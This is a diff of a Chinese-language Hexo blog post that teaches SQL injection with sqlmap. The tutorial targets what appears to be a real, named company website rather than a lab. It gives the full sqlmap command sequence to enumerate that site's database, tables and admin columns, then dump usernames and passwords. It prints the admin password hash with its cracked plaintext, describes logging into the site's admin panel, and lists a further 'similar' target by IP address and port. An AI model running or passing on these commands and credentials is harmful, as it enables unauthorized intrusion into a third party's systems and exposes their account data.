@@ -6,12 +6,12 @@
   
   <title>SQL注入漏洞（工具注入） | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="前置准备sqlmap.py在文件夹中找到sqlmap.py路径中输入cmd并回车，Windows系统的命令行 具体步骤找交互点1.具有GET请求的URL  ?关键词&#x3D;值  类似于?id&#x3D;14 ?keyword&#x3D;aaa2.登录框3.搜索框 验证注入点采用最简单的恶意语句 ？id&#x3D;aaa’ 尝试传输，查看页面回显是否是我们想要的效果–数据库会报错 –无法正常查询">
+  <meta name="description" content="前置准备sqlmap.py在文件夹中找到sqlmap.py路径中输入cmd并回车，Windows系统的命令行网址http:&#x2F;&#x2F;www.dlhayashi.com&#x2F;登陆点http:&#x2F;&#x2F;www.dlhayashi.com&#x2F;admin&#x2F; 具体步骤找交互点1.具有GET请求的URL  ?关键词&#x3D;值  类似于?id&#x3D;14 ?keyword&#x3D;aaa2.登录框3.搜索框 验证注入点">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入漏洞（工具注入）">
 <meta property="og:url" content="https://penhuoshuwa.github.io/2025/11/04/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5%EF%BC%89/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="前置准备sqlmap.py在文件夹中找到sqlmap.py路径中输入cmd并回车，Windows系统的命令行 具体步骤找交互点1.具有GET请求的URL  ?关键词&#x3D;值  类似于?id&#x3D;14 ?keyword&#x3D;aaa2.登录框3.搜索框 验证注入点采用最简单的恶意语句 ？id&#x3D;aaa’ 尝试传输，查看页面回显是否是我们想要的效果–数据库会报错 –无法正常查询">
+<meta property="og:description" content="前置准备sqlmap.py在文件夹中找到sqlmap.py路径中输入cmd并回车，Windows系统的命令行网址http:&#x2F;&#x2F;www.dlhayashi.com&#x2F;登陆点http:&#x2F;&#x2F;www.dlhayashi.com&#x2F;admin&#x2F; 具体步骤找交互点1.具有GET请求的URL  ?关键词&#x3D;值  类似于?id&#x3D;14 ?keyword&#x3D;aaa2.登录框3.搜索框 验证注入点">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://penhuoshuwa.github.io/images/sql1.png">
 <meta property="og:image" content="https://penhuoshuwa.github.io/images/sql2.png">
@@ -22,7 +22,7 @@
 <meta property="og:image" content="https://penhuoshuwa.github.io/images/sql7.png">
 <meta property="og:image" content="https://penhuoshuwa.github.io/images/sql8.png">
 <meta property="article:published_time" content="2025-11-03T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-11-04T12:52:52.467Z">
+<meta property="article:modified_time" content="2025-11-05T06:13:10.577Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://penhuoshuwa.github.io/images/sql1.png">
@@ -104,21 +104,21 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="前置准备sqlmap-py"><a href="#前置准备sqlmap-py" class="headerlink" title="前置准备sqlmap.py"></a>前置准备sqlmap.py</h1><p>在文件夹中找到sqlmap.py<br><img src="/images/sql1.png"><br>路径中输入cmd并回车，Windows系统的命令行<br><img src="/images/sql2.png"></p>
+        <h1 id="前置准备sqlmap-py"><a href="#前置准备sqlmap-py" class="headerlink" title="前置准备sqlmap.py"></a>前置准备sqlmap.py</h1><p>在文件夹中找到sqlmap.py<br><img src="/images/sql1.png"><br>路径中输入cmd并回车，Windows系统的命令行<br><img src="/images/sql2.png"><br>网址<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/">http://www.dlhayashi.com/</a><br>登陆点<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/admin/">http://www.dlhayashi.com/admin/</a></p>
 <h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="找交互点"><a href="#找交互点" class="headerlink" title="找交互点"></a>找交互点</h2><p>1.具有GET请求的URL  ?关键词&#x3D;值  类似于?id&#x3D;14 ?keyword&#x3D;aaa<br>2.登录框<br>3.搜索框<br><img src="/images/sql3.png"></p>
 <h2 id="验证注入点"><a href="#验证注入点" class="headerlink" title="验证注入点"></a>验证注入点</h2><p>采用最简单的恶意语句 ？id&#x3D;aaa’ 尝试传输，查看页面回显是否是我们想要的效果<br>–数据库会报错 –无法正常查询数据 –页面将会异常回显(空白&#x2F;回显SQL的报错)<br>例如<br><img src="/images/sql4.png"></p>
 <h2 id="挖数据库名称（database或是db）、数据表名称（table）、数据列名称（column）"><a href="#挖数据库名称（database或是db）、数据表名称（table）、数据列名称（column）" class="headerlink" title="挖数据库名称（database或是db）、数据表名称（table）、数据列名称（column）"></a>挖数据库名称（database或是db）、数据表名称（table）、数据列名称（column）</h2><p>注：从此处开始要用到sqlmap.py<br>数据库名称<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ –current-db</p>
 <h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>-u — 指定具有注入点的URL<br>–current-db — 挖出当前网站的数据库名称</p>
 <h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>输入后按回车，遇到y&#x2F;n写y并回车<br>在ending上方3到5行可以找到挖出的东西<br><img src="/images/sql5.png"><br>数据表名称<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ -D qdm177261645_db –tables</p>
 <h3 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h3><p>-D — 指定要攻击的数据库名称<br>–tables — 挖出当前网站数据库中所有的数据表名称</p>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p><img src="/images/sql6.png"><br>一般挖admin管理员<br>数据列名称<br>输入输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ -D qdm177261645_db -T jm_admin –columns<br><img src="/images/sql7.png"><br>挖数据<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ -D qdm177261645_db -T jm_admin -C username,password –dump<br><img src="/images/sql8.png"><br>注:<br>用户名：admin<br>密码： 1c63129ae9db9c60c3e8aa94d3e00495 — 数据库中本身保存的密文密码 — 密文密码无法直接登录<br>1qaz2wsx — sqlmap帮你解码出来的明文密码 明文密码可以直接登录</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p><img src="/images/sql6.png"><br>一般挖admin管理员<br>数据列名称<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ -D qdm177261645_db -T jm_admin –columns<br><img src="/images/sql7.png"><br>挖数据<br>输入python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/index.php?c=news&a=show&id=8">http://www.dlhayashi.com/index.php?c=news&amp;a=show&amp;id=8</a>“ -D qdm177261645_db -T jm_admin -C username,password –dump<br><img src="/images/sql8.png"><br>注:<br>用户名：admin<br>密码： 1c63129ae9db9c60c3e8aa94d3e00495 — 数据库中本身保存的密文密码 — 密文密码无法直接登录<br>1qaz2wsx — sqlmap帮你解码出来的明文密码 明文密码可以直接登录</p>
 <h2 id="进入登入点http-www-dlhayashi-com-admin"><a href="#进入登入点http-www-dlhayashi-com-admin" class="headerlink" title="进入登入点http://www.dlhayashi.com/admin/"></a>进入登入点<a target="_blank" rel="noopener" href="http://www.dlhayashi.com/admin/">http://www.dlhayashi.com/admin/</a></h2><p>输入账号与密码成功进入</p>
-<h1 id="最后给个同类型的网站"><a href="#最后给个同类型的网站" class="headerlink" title="最后给个同类型的网站"></a>最后给个同类型的网站</h1><p><a target="_blank" rel="noopener" href="http://43.139.231.237:34021/">http://43.139.231.237:34021/</a></p>
+<h1 id="同类型的网站"><a href="#同类型的网站" class="headerlink" title="同类型的网站"></a>同类型的网站</h1><p><a target="_blank" rel="noopener" href="http://43.139.231.237:34021/">http://43.139.231.237:34021/</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://penhuoshuwa.github.io/2025/11/04/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmhku8gnq0006fcw95dj8e2l4" data-title="SQL注入漏洞（工具注入）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://penhuoshuwa.github.io/2025/11/04/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmhllqoiy0006hsw90cl60a49" data-title="SQL注入漏洞（工具注入）" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -185,6 +185,10 @@
       <ul>
         
           <li>
+            <a href="/2025/11/05/from_http/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2025/11/05/Ping%EF%BC%9F%EF%BC%9F/">webPing？？</a>
           </li>
         
@@ -198,10 +202,6 @@
         
           <li>
             <a href="/2025/11/04/%E5%88%A9%E7%94%A8burp%20suit%20%E4%BF%AE%E6%94%B9%E6%94%AF%E4%BB%98%E9%87%91%E9%A2%9D/">利用burp suit修改支付金额</a>
-          </li>
-        
-          <li>
-            <a href="/2025/10/12/hello-world/">Hello World</a>
           </li>
         
       </ul>
